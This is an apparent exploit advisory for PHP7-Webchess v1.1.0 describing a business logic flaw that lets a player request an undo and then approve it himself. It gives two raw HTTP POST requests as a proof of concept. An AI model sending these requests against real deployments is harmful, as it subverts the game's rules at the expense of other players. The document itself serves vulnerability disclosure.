# Exploit Title: PHP7-Webchess v1.1.0 - Business Logic Error
## Date: 2/1/2024
## Vendor Homepage: https://github.com/halojoy/PHP7-Webchess
## Tested on: Debian Linux, Apache, Mysql
## Vendor: PHP7-Webchess
## Version: v1.1.0
## Exploit Description:
## PHP7-Webchess v1.1.0 suffers from BLE - Business Logic Error Vulnerability allowing attackers to first post a requestUndo and then agree with this request.

## ---------------------------------POC-----------------------------
```
POST /chess.php HTTP/1.1
...

requestUndo=yes&requestDraw=no&resign=no&fromRow=&fromCol=&toRow=&toCol=&isInCheck=false&isCheckMate=false
```
```
POST /chess.php HTTP/1.1
...

undoResponse=yes&isUndoResponseDone=yes&requestUndo=no&requestDraw=no&resign=no&fromRow=&fromCol=&toRow=&toCol=&isInCheck=false&isCheckMate=false
```